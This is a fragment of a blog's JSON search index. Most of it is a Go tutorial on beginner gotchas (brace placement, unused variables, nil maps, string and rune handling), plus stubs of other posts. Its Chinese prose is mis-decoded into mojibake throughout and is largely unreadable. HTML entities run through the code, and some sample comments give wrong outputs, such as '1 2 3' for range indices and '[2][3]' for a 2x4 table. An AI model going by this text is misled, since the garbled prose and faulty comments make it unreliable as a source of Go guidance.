name":"å¹´ç»ˆæ€»ç»“","slug":"å¹´ç»ˆæ€»ç»“","permalink":"https://www.0x2beace.com/categories/%E5%B9%B4%E7%BB%88%E6%80%BB%E7%BB%93/"}],"tags":[{"name":"å¹´ç»ˆæ€»ç»“","slug":"å¹´ç»ˆæ€»ç»“","permalink":"https://www.0x2beace.com/tags/%E5%B9%B4%E7%BB%88%E6%80%BB%E7%BB%93/"}]},{"title":"Go è¯­è¨€å¸¸è§é”™è¯¯å’Œé™·é˜±","slug":"gotchas-and-common-mistakes-in-go-golang","date":"2022-12-29T02:30:06.000Z","updated":"2023-02-18T03:28:33.599Z","comments":true,"path":"gotchas-and-common-mistakes-in-go-golang/","link":"","permalink":"https://www.0x2beace.com/gotchas-and-common-mistakes-in-go-golang/","excerpt":"Go æ˜¯ä¸€é—¨ç®€å•æœ‰è¶£çš„ç¼–ç¨‹è¯­è¨€ï¼Œä¸å…¶ä»–è¯­è¨€ä¸€æ ·ï¼Œåœ¨ä½¿ç”¨æ—¶ä¸å…ä¼šé‡åˆ°å¾ˆå¤šå‘ï¼Œä¸è¿‡å®ƒä»¬å¤§å¤šä¸æ˜¯ Go æœ¬èº«çš„è®¾è®¡ç¼ºé™·ã€‚å¦‚æœä½ åˆšä»å…¶ä»–è¯­è¨€è½¬åˆ° Goï¼Œé‚£è¿™ç¯‡æ–‡ç« é‡Œçš„å‘å¤šåŠä¼šè¸©åˆ°ã€‚","text":"Go æ˜¯ä¸€é—¨ç®€å•æœ‰è¶£çš„ç¼–ç¨‹è¯­è¨€ï¼Œä¸å…¶ä»–è¯­è¨€ä¸€æ ·ï¼Œåœ¨ä½¿ç”¨æ—¶ä¸å…ä¼šé‡åˆ°å¾ˆå¤šå‘ï¼Œä¸è¿‡å®ƒä»¬å¤§å¤šä¸æ˜¯ Go æœ¬èº«çš„è®¾è®¡ç¼ºé™·ã€‚å¦‚æœä½ åˆšä»å…¶ä»–è¯­è¨€è½¬åˆ° Goï¼Œé‚£è¿™ç¯‡æ–‡ç« é‡Œçš„å‘å¤šåŠä¼šè¸©åˆ°ã€‚ åˆçº§1.å·¦å¤§æ‹¬å·ä¸èƒ½å•ç‹¬æ”¾ä¸€è¡Œåœ¨å…¶ä»–å¤§å¤šæ•°è¯­è¨€ä¸­ï¼Œ{ çš„ä½ç½®ä½ è‡ªè¡Œå†³å®šã€‚Goæ¯”è¾ƒç‰¹åˆ«ï¼Œéµå®ˆåˆ†å·æ³¨å…¥è§„åˆ™ï¼ˆautomatic semicolon injectionï¼‰ï¼šç¼–è¯‘å™¨ä¼šåœ¨æ¯è¡Œä»£ç å°¾éƒ¨ç‰¹å®šåˆ†éš”ç¬¦ååŠ ;æ¥åˆ†éš”å¤šæ¡è¯­å¥ï¼Œæ¯”å¦‚ä¼šåœ¨ ) ååŠ åˆ†å·ï¼š 123456789101112131415161718// é”™è¯¯ç¤ºä¾‹func main() &#123; println(\"hello world\")&#125;// ç­‰æ•ˆäºfunc main(); // æ— å‡½æ•°ä½“ &#123; println(\"hello world\")&#125; ./main.go: missing function body ./main.go: syntax error: unexpected semicolon or newline before &#123;// æ­£ç¡®ç¤ºä¾‹func main() &#123; println(\"hello world\")&#125; 2.æœªä½¿ç”¨çš„å˜é‡å¦‚æœåœ¨å‡½æ•°ä½“ä»£ç ä¸­æœ‰æœªä½¿ç”¨çš„å˜é‡ï¼Œåˆ™æ— æ³•é€šè¿‡ç¼–è¯‘ï¼Œä¸è¿‡å…¨å±€å˜é‡å£°æ˜ä½†ä¸ä½¿ç”¨æ˜¯å¯ä»¥çš„ã€‚å³ä½¿å˜é‡å£°æ˜åä¸ºå˜é‡èµ‹å€¼ï¼Œä¾æ—§æ— æ³•é€šè¿‡ç¼–è¯‘ï¼Œéœ€åœ¨æŸå¤„ä½¿ç”¨å®ƒï¼š 12345678910111213141516171819202122232425// é”™è¯¯ç¤ºä¾‹var gvar int // å…¨å±€å˜é‡ï¼Œå£°æ˜ä¸ä½¿ç”¨ä¹Ÿå¯ä»¥func main() &#123; var one int // error: one declared and not used two := 2 // error: two declared and not used var three int // error: three declared and not used three = 3 &#125;// æ­£ç¡®ç¤ºä¾‹// å¯ä»¥ç›´æ¥æ³¨é‡Šæˆ–ç§»é™¤æœªä½¿ç”¨çš„å˜é‡func main() &#123; var one int _ = one two := 2 println(two) var three int one = three var four int four = four&#125; 3.æœªä½¿ç”¨çš„ importå¦‚æœä½  importä¸€ä¸ªåŒ…ï¼Œä½†åŒ…ä¸­çš„å˜é‡ã€å‡½æ•°ã€æ¥å£å’Œç»“æ„ä½“ä¸€ä¸ªéƒ½æ²¡æœ‰ç”¨åˆ°çš„è¯ï¼Œå°†ç¼–è¯‘å¤±è´¥ã€‚å¯ä»¥ä½¿ç”¨ _ä¸‹åˆ’çº¿ç¬¦å·ä½œä¸ºåˆ«åæ¥å¿½ç•¥å¯¼å…¥çš„åŒ…ï¼Œä»è€Œé¿å…ç¼–è¯‘é”™è¯¯ï¼Œè¿™åªä¼šæ‰§è¡Œ package çš„ init() 12345678910111213141516171819202122// é”™è¯¯ç¤ºä¾‹import ( \"fmt\" // imported and not used: \"fmt\" \"log\" // imported and not used: \"log\" \"time\" // imported and not used: \"time\")func main() &#123;&#125;// æ­£ç¡®ç¤ºä¾‹// å¯ä»¥ä½¿ç”¨ goimports å·¥å…·æ¥æ³¨é‡Šæˆ–ç§»é™¤æœªä½¿ç”¨åˆ°çš„åŒ…import ( _ \"fmt\" \"log\" \"time\")func main() &#123; _ = log.Println _ = time.Now&#125; 4.ç®€çŸ­å£°æ˜çš„å˜é‡åªèƒ½åœ¨å‡½æ•°å†…éƒ¨ä½¿ç”¨123456789// é”™è¯¯ç¤ºä¾‹myvar := 1 // syntax error: non-declaration statement outside function bodyfunc main() &#123;&#125;// æ­£ç¡®ç¤ºä¾‹var myvar = 1func main() &#123;&#125; 5.ä½¿ç”¨ç®€çŸ­å£°æ˜æ¥é‡å¤å£°æ˜å˜é‡ä¸èƒ½ç”¨ç®€çŸ­å£°æ˜æ–¹å¼æ¥å•ç‹¬ä¸ºä¸€ä¸ªå˜é‡é‡å¤å£°æ˜ï¼Œ:=å·¦ä¾§è‡³å°‘æœ‰ä¸€ä¸ªæ–°å˜é‡ï¼Œæ‰å…è®¸å¤šå˜é‡çš„é‡å¤å£°æ˜ï¼š 123456789101112// é”™è¯¯ç¤ºä¾‹func main() &#123; one := 0 one := 1 // error: no new variables on left side of :=&#125;// æ­£ç¡®ç¤ºä¾‹func main() &#123; one := 0 one, two := 1, 2 // two æ˜¯æ–°å˜é‡ï¼Œå…è®¸ one çš„é‡å¤å£°æ˜ã€‚æ¯”å¦‚ error å¤„ç†ç»å¸¸ç”¨åŒåå˜é‡ err one, two = two, one // äº¤æ¢ä¸¤ä¸ªå˜é‡å€¼çš„ç®€å†™&#125; 6.ä¸èƒ½ä½¿ç”¨ç®€çŸ­å£°æ˜æ¥è®¾ç½®å­—æ®µçš„å€¼struct çš„å˜é‡å­—æ®µä¸èƒ½ä½¿ç”¨ := æ¥èµ‹å€¼ä»¥ä½¿ç”¨é¢„å®šä¹‰çš„å˜é‡æ¥é¿å…è§£å†³ï¼š 12345678910111213141516171819202122232425262728// é”™è¯¯ç¤ºä¾‹type info struct &#123; result int&#125;func work() (int, error) &#123; return 3, nil&#125;func main() &#123; var data info data.result, err := work() // error: non-name data.result on left side of := fmt.Printf(\"info: %+v\\n\", data)&#125;// æ­£ç¡®ç¤ºä¾‹func main() &#123; var data info var err error // err éœ€è¦é¢„å£°æ˜ data.result, err = work() if err != nil &#123; fmt.Println(err) return &#125; fmt.Printf(\"info: %+v\\n\", data)&#125; 7.ä¸å°å¿ƒè¦†ç›–äº†å˜é‡å¯¹ä»åŠ¨æ€è¯­è¨€è½¬è¿‡æ¥çš„å¼€å‘è€…æ¥è¯´ï¼Œç®€çŸ­å£°æ˜å¾ˆå¥½ç”¨ï¼Œè¿™å¯èƒ½ä¼šè®©äººè¯¯ä¼š := æ˜¯ä¸€ä¸ªèµ‹å€¼æ“ä½œç¬¦ã€‚å¦‚æœä½ åœ¨æ–°çš„ä»£ç å—ä¸­åƒä¸‹è¾¹è¿™æ ·è¯¯ç”¨äº† :=ï¼Œç¼–è¯‘ä¸ä¼šæŠ¥é”™ï¼Œä½†æ˜¯å˜é‡ä¸ä¼šæŒ‰ä½ çš„é¢„æœŸå·¥ä½œï¼š 12345678910func main() &#123; x := 1 println(x) // 1 &#123; println(x) // 1 x := 2 println(x) // 2 // æ–°çš„ x å˜é‡çš„ä½œç”¨åŸŸåªåœ¨ä»£ç å—å†…éƒ¨ &#125; println(x) // 1&#125; è¿™æ˜¯ Go å¼€å‘è€…å¸¸çŠ¯çš„é”™ï¼Œè€Œä¸”ä¸æ˜“è¢«å‘ç°ã€‚å¯ä½¿ç”¨ vetå·¥å…·æ¥è¯Šæ–­è¿™ç§å˜é‡è¦†ç›–ï¼ŒGo é»˜è®¤ä¸åšè¦†ç›–æ£€æŸ¥ï¼Œæ·»åŠ  -shadow é€‰é¡¹æ¥å¯ç”¨ï¼š 12&gt; go tool vet -shadow main.gomain.go:9: declaration of \"x\" shadows declaration at main.go:5 æ³¨æ„ vet ä¸ä¼šæŠ¥å‘Šå…¨éƒ¨è¢«è¦†ç›–çš„å˜é‡ï¼Œå¯ä»¥ä½¿ç”¨ go-nyet æ¥åšè¿›ä¸€æ­¥çš„æ£€æµ‹ï¼š 12&gt; $GOPATH/bin/go-nyet main.gomain.go:10:3:Shadowing variable `x` 8.æ˜¾å¼ç±»å‹çš„å˜é‡æ— æ³•ä½¿ç”¨ nil æ¥åˆå§‹åŒ–nil æ˜¯ interfaceã€functionã€pointerã€mapã€slice å’Œ channel ç±»å‹å˜é‡çš„é»˜è®¤åˆå§‹å€¼ã€‚ä½†å£°æ˜æ—¶ä¸æŒ‡å®šç±»å‹ï¼Œç¼–è¯‘å™¨ä¹Ÿæ— æ³•æ¨æ–­å‡ºå˜é‡çš„å…·ä½“ç±»å‹ã€‚ 1234567891011// é”™è¯¯ç¤ºä¾‹func main() &#123; var x = nil // error: use of untyped nil _ = x&#125;// æ­£ç¡®ç¤ºä¾‹func main() &#123; var x interface&#123;&#125; = nil _ = x&#125; 9.ç›´æ¥ä½¿ç”¨å€¼ä¸º nil çš„ sliceã€mapå…è®¸å¯¹å€¼ä¸º nil çš„ slice æ·»åŠ å…ƒç´ ï¼Œä½†å¯¹å€¼ä¸º nil çš„ mapæ·»åŠ å…ƒç´ åˆ™ä¼šé€ æˆè¿è¡Œæ—¶ panic 123456789101112// map é”™è¯¯ç¤ºä¾‹func main() &#123; var m map[string]int m[\"one\"] = 1 // error: panic: assignment to entry in nil map // m := make(map[string]int)// map çš„æ­£ç¡®å£°æ˜ï¼Œåˆ†é…äº†å®é™…çš„å†…å­˜&#125; // slice æ­£ç¡®ç¤ºä¾‹func main() &#123; var s []int s = append(s, 1)&#125; 10.map å®¹é‡åœ¨åˆ›å»º map ç±»å‹çš„å˜é‡æ—¶å¯ä»¥æŒ‡å®šå®¹é‡ï¼Œä½†ä¸èƒ½åƒ slice ä¸€æ ·ä½¿ç”¨ cap() æ¥æ£€æµ‹åˆ†é…ç©ºé—´çš„å¤§å°ï¼š 12345// é”™è¯¯ç¤ºä¾‹func main() &#123; m := make(map[string]int, 99) println(cap(m)) // error: invalid argument m1 (type map[string]int) for cap &#125; 11.string ç±»å‹çš„å˜é‡å€¼ä¸èƒ½ä¸º nilå¯¹é‚£äº›å–œæ¬¢ç”¨ nil åˆå§‹åŒ–å­—ç¬¦ä¸²çš„äººæ¥è¯´ï¼Œè¿™å°±æ˜¯å‘ï¼š 123456789101112131415// é”™è¯¯ç¤ºä¾‹func main() &#123; var s string = nil // cannot use nil as type string in assignment if s == nil &#123; // invalid operation: s == nil (mismatched types string and nil) s = \"default\" &#125;&#125;// æ­£ç¡®ç¤ºä¾‹func main() &#123; var s string // å­—ç¬¦ä¸²ç±»å‹çš„é›¶å€¼æ˜¯ç©ºä¸² \"\" if s == \"\" &#123; s = \"default\" &#125;&#125; 12.Array ç±»å‹çš„å€¼ä½œä¸ºå‡½æ•°å‚æ•°åœ¨ C/C++ ä¸­ï¼Œæ•°ç»„ï¼ˆåï¼‰æ˜¯æŒ‡é’ˆã€‚å°†æ•°ç»„ä½œä¸ºå‚æ•°ä¼ è¿›å‡½æ•°æ—¶ï¼Œç›¸å½“äºä¼ é€’äº†æ•°ç»„å†…å­˜åœ°å€çš„å¼•ç”¨ï¼Œåœ¨å‡½æ•°å†…éƒ¨ä¼šæ”¹å˜è¯¥æ•°ç»„çš„å€¼ã€‚ åœ¨ Go ä¸­ï¼Œæ•°ç»„æ˜¯å€¼ã€‚ä½œä¸ºå‚æ•°ä¼ è¿›å‡½æ•°æ—¶ï¼Œä¼ é€’çš„æ˜¯æ•°ç»„çš„åŸå§‹å€¼æ‹·è´ï¼Œæ­¤æ—¶åœ¨å‡½æ•°å†…éƒ¨æ˜¯æ— æ³•æ›´æ–°è¯¥æ•°ç»„çš„ï¼š 12345678910// æ•°ç»„ä½¿ç”¨å€¼æ‹·è´ä¼ å‚func main() &#123; x := [3]int&#123;1,2,3&#125; func(arr [3]int) &#123; arr[0] = 7 fmt.Println(arr) // [7 2 3] &#125;(x) fmt.Println(x) // [1 2 3] // å¹¶ä¸æ˜¯ä½ ä»¥ä¸ºçš„ [7 2 3]&#125; å¦‚æœæƒ³ä¿®æ”¹å‚æ•°æ•°ç»„ï¼š ç›´æ¥ä¼ é€’æŒ‡å‘è¿™ä¸ªæ•°ç»„çš„æŒ‡é’ˆç±»å‹ï¼š 12345678910// ä¼ å€ä¼šä¿®æ”¹åŸæ•°æ®func main() &#123; x := [3]int&#123;1,2,3&#125; func(arr *[3]int) &#123; (*arr)[0] = 7 fmt.Println(arr) // &amp;[7 2 3] &#125;(&amp;x) fmt.Println(x) // [7 2 3]&#125; ç›´æ¥ä½¿ç”¨ sliceï¼šå³ä½¿å‡½æ•°å†…éƒ¨å¾—åˆ°çš„æ˜¯ slice çš„å€¼æ‹·è´ï¼Œä½†ä¾æ—§ä¼šæ›´æ–° slice çš„åŸå§‹æ•°æ®ï¼ˆåº•å±‚ arrayï¼‰ 123456789// ä¼šä¿®æ”¹ slice çš„åº•å±‚ arrayï¼Œä»è€Œä¿®æ”¹ slicefunc main() &#123; x := []int&#123;1, 2, 3&#125; func(arr []int) &#123; arr[0] = 7 fmt.Println(x) // [7 2 3] &#125;(x) fmt.Println(x) // [7 2 3]&#125; 13.range éå† slice å’Œ array æ—¶æ··æ·†äº†è¿”å›å€¼ä¸å…¶ä»–ç¼–ç¨‹è¯­è¨€ä¸­çš„ for-in ã€foreach éå†è¯­å¥ä¸åŒï¼ŒGo ä¸­çš„ range åœ¨éå†æ—¶ä¼šç”Ÿæˆ 2 ä¸ªå€¼ï¼Œç¬¬ä¸€ä¸ªæ˜¯å…ƒç´ ç´¢å¼•ï¼Œç¬¬äºŒä¸ªæ˜¯å…ƒç´ çš„å€¼ï¼š 12345678910111213141516// é”™è¯¯ç¤ºä¾‹func main() &#123; x := []string&#123;\"a\", \"b\", \"c\"&#125; for v := range x &#123; fmt.Println(v) // 1 2 3 &#125;&#125;// æ­£ç¡®ç¤ºä¾‹func main() &#123; x := []string&#123;\"a\", \"b\", \"c\"&#125; for _, v := range x &#123; // ä½¿ç”¨ _ ä¸¢å¼ƒç´¢å¼• fmt.Println(v) &#125;&#125; 14.slice å’Œ array å…¶å®æ˜¯ä¸€ç»´æ•°æ®çœ‹èµ·æ¥ Go æ”¯æŒå¤šç»´çš„ array å’Œ sliceï¼Œå¯ä»¥åˆ›å»ºæ•°ç»„çš„æ•°ç»„ã€åˆ‡ç‰‡çš„åˆ‡ç‰‡ï¼Œä½†å…¶å®å¹¶ä¸æ˜¯ã€‚ å¯¹ä¾èµ–åŠ¨æ€è®¡ç®—å¤šç»´æ•°ç»„å€¼çš„åº”ç”¨æ¥è¯´ï¼Œå°±æ€§èƒ½å’Œå¤æ‚åº¦è€Œè¨€ï¼Œç”¨ Go å®ç°çš„æ•ˆæœå¹¶ä¸ç†æƒ³ã€‚ å¯ä»¥ä½¿ç”¨åŸå§‹çš„ä¸€ç»´æ•°ç»„ã€â€œç‹¬ç«‹â€œ çš„åˆ‡ç‰‡ã€â€œå…±äº«åº•å±‚æ•°ç»„â€çš„åˆ‡ç‰‡æ¥åˆ›å»ºåŠ¨æ€çš„å¤šç»´æ•°ç»„ã€‚ 1.ä½¿ç”¨åŸå§‹çš„ä¸€ç»´æ•°ç»„ï¼šè¦åšå¥½ç´¢å¼•æ£€æŸ¥ã€æº¢å‡ºæ£€æµ‹ã€ä»¥åŠå½“æ•°ç»„æ»¡æ—¶å†æ·»åŠ å€¼æ—¶è¦é‡æ–°åšå†…å­˜åˆ†é…ã€‚ 2.ä½¿ç”¨â€œç‹¬ç«‹â€çš„åˆ‡ç‰‡åˆ†ä¸¤æ­¥ï¼š åˆ›å»ºå¤–éƒ¨ slice å¯¹æ¯ä¸ªå†…éƒ¨ slice è¿›è¡Œå†…å­˜åˆ†é… æ³¨æ„å†…éƒ¨çš„ slice ç›¸äº’ç‹¬ç«‹ï¼Œä½¿å¾—ä»»ä¸€å†…éƒ¨ slice å¢ç¼©éƒ½ä¸ä¼šå½±å“åˆ°å…¶ä»–çš„ slice 12345678910// ä½¿ç”¨å„è‡ªç‹¬ç«‹çš„ 6 ä¸ª slice æ¥åˆ›å»º [2][3] çš„åŠ¨æ€å¤šç»´æ•°ç»„func main() &#123; x := 2 y := 4 table := make([][]int, x) for i := range table &#123; table[i] = make([]int, y) &#125;&#125; 1.ä½¿ç”¨â€œå…±äº«åº•å±‚æ•°ç»„â€çš„åˆ‡ç‰‡ åˆ›å»ºä¸€ä¸ªå­˜æ”¾åŸå§‹æ•°æ®çš„å®¹å™¨ slice åˆ›å»ºå…¶ä»–çš„ slice åˆ‡å‰²åŸå§‹ slice æ¥åˆå§‹åŒ–å…¶ä»–çš„ slice 12345678910111213141516171819202122func main() &#123; h, w := 2, 4 raw := make([]int, h*w) for i := range raw &#123; raw[i] = i &#125; // åˆå§‹åŒ–åŸå§‹ slice fmt.Println(raw, &amp;raw[4]) // [0 1 2 3 4 5 6 7] 0xc420012120 table := make([][]int, h) for i := range table &#123; // ç­‰é—´è·åˆ‡å‰²åŸå§‹ sliceï¼Œåˆ›å»ºåŠ¨æ€å¤šç»´æ•°ç»„ table // 0: raw[0*4: 0*4 + 4] // 1: raw[1*4: 1*4 + 4] table[i] = raw[i*w : i*w + w] &#125; fmt.Println(table, &amp;table[1][0]) // [[0 1 2 3] [4 5 6 7]] 0xc420012120&#125; æ›´å¤šå…³äºå¤šç»´æ•°ç»„çš„å‚è€ƒ go-how-is-two-dimensional-arrays-memory-representation what-is-a-concise-way-to-create-a-2d-slice-in-go 15.è®¿é—® map ä¸­ä¸å­˜åœ¨çš„ keyå’Œå…¶ä»–ç¼–ç¨‹è¯­è¨€ç±»ä¼¼ï¼Œå¦‚æœè®¿é—®äº† map ä¸­ä¸å­˜åœ¨çš„ key åˆ™å¸Œæœ›èƒ½è¿”å› nilï¼Œæ¯”å¦‚åœ¨ PHP ä¸­ï¼š 12&gt; php -r '$v = [\"x\"=&gt;1, \"y\"=&gt;2]; @var_dump($v[\"z\"]);'NULL Go åˆ™ä¼šè¿”å›å…ƒç´ å¯¹åº”æ•°æ®ç±»å‹çš„é›¶å€¼ï¼Œæ¯”å¦‚ nilã€â€™â€™ ã€false å’Œ 0ï¼Œå–å€¼æ“ä½œæ€»æœ‰å€¼è¿”å›ï¼Œæ•…ä¸èƒ½é€šè¿‡å–å‡ºæ¥çš„å€¼æ¥åˆ¤æ–­ key æ˜¯ä¸æ˜¯åœ¨ map ä¸­ã€‚ é€šå¸¸ä½¿ç”¨ comma ok æƒ¯ç”¨æ³•æ¥åˆ¤æ–­ key æ˜¯å¦å­˜åœ¨ï¼š 123456789101112131415// é”™è¯¯çš„ key æ£€æµ‹æ–¹å¼func main() &#123; x := map[string]string&#123;\"one\": \"2\", \"two\": \"\", \"three\": \"3\"&#125; if v := x[\"two\"]; v == \"\" &#123; fmt.Println(\"key two is no entry\") // é”® two å­˜ä¸å­˜åœ¨éƒ½ä¼šè¿”å›çš„ç©ºå­—ç¬¦ä¸² &#125;&#125;// æ­£ç¡®ç¤ºä¾‹func main() &#123; x := map[string]string&#123;\"one\": \"2\", \"two\": \"\", \"three\": \"3\"&#125; if _, ok := x[\"two\"]; !ok &#123; fmt.Println(\"key two is no entry\") &#125;&#125; 16.string ç±»å‹çš„å€¼æ˜¯å¸¸é‡ï¼Œä¸å¯æ›´æ”¹å°è¯•ä½¿ç”¨ç´¢å¼•éå†å­—ç¬¦ä¸²ï¼Œæ¥æ›´æ–°å­—ç¬¦ä¸²ä¸­çš„ä¸ªåˆ«å­—ç¬¦ï¼Œæ˜¯ä¸å…è®¸çš„ã€‚ string ç±»å‹çš„å€¼æ˜¯åªè¯»çš„äºŒè¿›åˆ¶ byte sliceï¼Œå¦‚æœçœŸè¦ä¿®æ”¹å­—ç¬¦ä¸²ä¸­çš„å­—ç¬¦ï¼Œå°† string è½¬ä¸º []byte ä¿®æ”¹åï¼Œå†è½¬ä¸º string å³å¯ï¼š 123456789101112131415// ä¿®æ”¹å­—ç¬¦ä¸²çš„é”™è¯¯ç¤ºä¾‹func main() &#123; x := \"text\" x[0] = \"T\" // error: cannot assign to x[0] fmt.Println(x)&#125;// ä¿®æ”¹ç¤ºä¾‹func main() &#123; x := \"text\" xBytes := []byte(x) xBytes[0] = 'T' // æ³¨æ„æ­¤æ—¶çš„ T æ˜¯ rune ç±»å‹ x = string(xBytes) fmt.Println(x) // Text&#125; æ³¨æ„ï¼š ä¸Šè¾¹çš„ç¤ºä¾‹å¹¶ä¸æ˜¯æ›´æ–°å­—ç¬¦ä¸²çš„æ­£ç¡®å§¿åŠ¿ï¼Œå› ä¸ºä¸€ä¸ª UTF8 ç¼–ç çš„å­—ç¬¦å¯èƒ½ä¼šå å¤šä¸ªå­—èŠ‚ï¼Œæ¯”å¦‚æ±‰å­—å°±éœ€è¦ 3~4ä¸ªå­—èŠ‚æ¥å­˜å‚¨ï¼Œæ­¤æ—¶æ›´æ–°å…¶ä¸­çš„ä¸€ä¸ªå­—èŠ‚æ˜¯é”™è¯¯çš„ã€‚ æ›´æ–°å­—ä¸²çš„æ­£ç¡®å§¿åŠ¿ï¼šå°† string è½¬ä¸º rune sliceï¼ˆæ­¤æ—¶ 1 ä¸ª rune å¯èƒ½å å¤šä¸ª byteï¼‰ï¼Œç›´æ¥æ›´æ–° rune ä¸­çš„å­—ç¬¦ 1234567func main() &#123; x := \"text\" xRunes := []rune(x) xRunes[0] = 'æˆ‘' x = string(xRunes) fmt.Println(x) // æˆ‘ext&#125; 17.string ä¸ byte slice ä¹‹é—´çš„è½¬æ¢å½“è¿›è¡Œ string å’Œ byte slice ç›¸äº’è½¬æ¢æ—¶ï¼Œå‚ä¸è½¬æ¢çš„æ˜¯æ‹·è´çš„åŸå§‹å€¼ã€‚è¿™ç§è½¬æ¢çš„è¿‡ç¨‹ï¼Œä¸å…¶ä»–ç¼–ç¨‹è¯­çš„å¼ºåˆ¶ç±»å‹è½¬æ¢æ“ä½œä¸åŒï¼Œä¹Ÿå’Œæ–° slice ä¸æ—§ slice å…±äº«åº•å±‚æ•°ç»„ä¸åŒã€‚ Go åœ¨ string ä¸ byte slice ç›¸äº’è½¬æ¢ä¸Šä¼˜åŒ–äº†ä¸¤ç‚¹ï¼Œé¿å…äº†é¢å¤–çš„å†…å­˜åˆ†é…ï¼š åœ¨ map[string] ä¸­æŸ¥æ‰¾ key æ—¶ï¼Œä½¿ç”¨äº†å¯¹åº”çš„ []byteï¼Œé¿å…åš m[string(key)] çš„å†…å­˜åˆ†é… ä½¿ç”¨ for range è¿­ä»£ string è½¬æ¢ä¸º []byte çš„è¿­ä»£ï¼šfor i,v := range []byte(str) {â€¦} 18.string ä¸ç´¢å¼•æ“ä½œç¬¦å¯¹å­—ç¬¦ä¸²ç”¨ç´¢å¼•è®¿é—®è¿”å›çš„ä¸æ˜¯å­—ç¬¦ï¼Œè€Œæ˜¯ä¸€ä¸ª byte å€¼ã€‚ è¿™ç§å¤„ç†æ–¹å¼å’Œå…¶ä»–è¯­è¨€ä¸€æ ·ï¼Œæ¯”å¦‚ PHP ä¸­ï¼š 12345678910111213&gt; php -r '$name=\"ä¸­æ–‡\"; var_dump($name);' # \"ä¸­æ–‡\" å ç”¨ 6 ä¸ªå­—èŠ‚string(6) \"ä¸­æ–‡\"&gt; php -r '$name=\"ä¸­æ–‡\"; var_dump($name[0]);' # æŠŠç¬¬ä¸€ä¸ªå­—èŠ‚å½“åš Unicode å­—ç¬¦è¯»å–ï¼Œæ˜¾ç¤º U+FFFDstring(1) \"ï¿½\" &gt; php -r '$name=\"ä¸­æ–‡\"; var_dump($name[0].$name[1].$name[2]);'string(3) \"ä¸­\"func main() &#123; x := \"ascii\" fmt.Println(x[0]) // 97 fmt.Printf(\"%T\\n\", x[0])// uint8&#125; å¦‚æœéœ€è¦ä½¿ç”¨ for range è¿­ä»£è®¿é—®å­—ç¬¦ä¸²ä¸­çš„å­—ç¬¦ï¼ˆunicode code point / runeï¼‰ï¼Œæ ‡å‡†åº“ä¸­æœ‰ &quot;unicode/utf8&quot; åŒ…æ¥åš UTF8 çš„ç›¸å…³è§£ç ç¼–ç ã€‚å¦å¤– utf8string ä¹Ÿæœ‰åƒ func (s *String) At(i int) rune ç­‰å¾ˆæ–¹ä¾¿çš„åº“å‡½æ•°ã€‚ 19.å­—ç¬¦ä¸²å¹¶ä¸éƒ½æ˜¯ UTF8 æ–‡æœ¬string çš„å€¼ä¸å¿…æ˜¯ UTF8 æ–‡æœ¬ï¼Œå¯ä»¥åŒ…å«ä»»æ„çš„å€¼ã€‚åªæœ‰å­—ç¬¦ä¸²æ˜¯æ–‡å­—å­—é¢å€¼æ—¶æ‰æ˜¯ UTF8 æ–‡æœ¬ï¼Œå­—ä¸²å¯ä»¥é€šè¿‡è½¬ä¹‰æ¥åŒ…å«å…¶ä»–æ•°æ®ã€‚ åˆ¤æ–­å­—ç¬¦ä¸²æ˜¯å¦æ˜¯ UTF8 æ–‡æœ¬ï¼Œå¯ä½¿ç”¨ â€œunicode/utf8â€ åŒ…ä¸­çš„ ValidString() å‡½æ•°ï¼š 12345678910func main() &#123; str1 := \"ABC\" fmt.Println(utf8.ValidString(str1)) // true str2 := \"A\\xfeC\" fmt.Println(utf8.ValidString(str2)) // false str3 := \"A\\\\xfeC\" fmt.Println(utf8.ValidString(str3)) // true // æŠŠè½¬ä¹‰å­—ç¬¦è½¬ä¹‰æˆå­—é¢å€¼&#125; 20.å­—ç¬¦ä¸²çš„é•¿åº¦åœ¨ Python ä¸­ï¼š 12data &#x3D; u&#39;â™¥&#39; print(len(data)) # 1 ç„¶è€Œåœ¨ Go ä¸­ï¼š 1234func main() &#123; char := \"â™¥\" fmt.Println(len(char)) // 3&#125; Go çš„å†…å»ºå‡½æ•° len() è¿”å›çš„æ˜¯å­—ç¬¦ä¸²çš„ byte æ•°é‡ï¼Œè€Œä¸æ˜¯åƒ Python ä¸­é‚£æ ·æ˜¯è®¡ç®— Unicode å­—ç¬¦æ•°ã€‚ å¦‚æœè¦å¾—åˆ°å­—ç¬¦ä¸²çš„å­—ç¬¦æ•°ï¼Œå¯ä½¿ç”¨ â€œunicode/utf8â€ åŒ…ä¸­çš„ RuneCountInString(str string) (n int) 1234func main() &#123; char := \"â™¥\" fmt.Println(utf8.RuneCountInString(char)) // 1&#125; æ³¨æ„ï¼š RuneCountInString å¹¶ä¸æ€»æ˜¯è¿”å›æˆ‘ä»¬çœ‹åˆ°çš„å­—ç¬¦æ•°ï¼Œå› ä¸ºæœ‰çš„å­—ç¬¦ä¼šå ç”¨ 2 ä¸ª runeï¼š 123456func main() &#123; char := \"Ã©\" fmt.Println(len(char)) // 3 fmt.Println(utf8.RuneCountInString(char)) // 2 fmt.Println(\"cafe\\u0301\") // cafÃ© // æ³•æ–‡çš„ cafeï¼Œå®é™…ä¸Šæ˜¯ä¸¤ä¸ª rune çš„ç»„åˆ&#125; ä¸­çº§å‚è€ƒé“¾æ¥ Golangæ–°æ‰‹å¯èƒ½ä¼šè¸©çš„58ä¸ªå‘ 50 Shades of Go: Traps, Gotchas, and Common Mistakes for New Golang Devs","categories":[{"name":"Go","slug":"Go","permalink":"https://www.0x2beace.com/categories/Go/"}],"tags":[{"name":"Go","slug":"Go","permalink":"https://www.0x2beace.com/tags/Go/"}]},{"title":"å¦‚ä½•è®¾è®¡ä¸€ä¸ªåƒä¸‡çº§æ¶æ„","slug":"how-to-design-a-tens-of-millions-of-architecture","date":"2022-12-24T07:36:30.000Z","updated":"2023-02-18T03:28:33.601Z","comments":true,"path":"how-to-design-a-tens-of-millions-of-architecture/","link":"","permalink":"https://www.0x2beace.com/how-to-design-a-tens-of-millions-of-architecture/","excerpt":"è¿™ç¯‡ç¬”è®°ç”¨æ¥è®°å½•å¦‚ä½•ä»å•æœºä¸€æ­¥æ­¥è®¾è®¡å‡ºæ”¯æŒç™¾ä¸‡çº§ã€åƒä¸‡çº§ã€äº¿çº§æ•°æ®çš„æ¶æ„ã€‚","text":"è¿™ç¯‡ç¬”è®°ç”¨æ¥è®°å½•å¦‚ä½•ä»å•æœºä¸€æ­¥æ­¥è®¾è®¡å‡ºæ”¯æŒç™¾ä¸‡çº§ã€åƒä¸‡çº§ã€äº¿çº§æ•°æ®çš„æ¶æ„ã€‚ 